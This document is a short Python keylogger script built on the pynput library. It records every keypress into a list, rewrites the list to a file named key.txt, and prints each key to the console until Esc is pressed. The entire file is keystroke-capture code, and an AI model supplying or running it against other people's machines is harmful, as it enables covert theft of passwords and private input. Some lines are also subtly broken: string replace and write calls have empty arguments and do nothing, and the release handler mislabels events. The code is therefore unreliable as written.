from pynput.keyboard import Key, Listener

keys = []

def write_file(keys):
    with open("key.txt", "w") as f:
        for key in keys:
            k = str(key).replace("","")
            f.write(k)
            f.write("")

def on_press(key):
    keys.append(key)
    write_file(keys)
    try:
        print(f"Alphanumerical key: {key.char} pressed")
    except AttributeError:
        print(f"Special key: {key} pressed")

def on_release(key):
    print(f"{key} pressed")
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()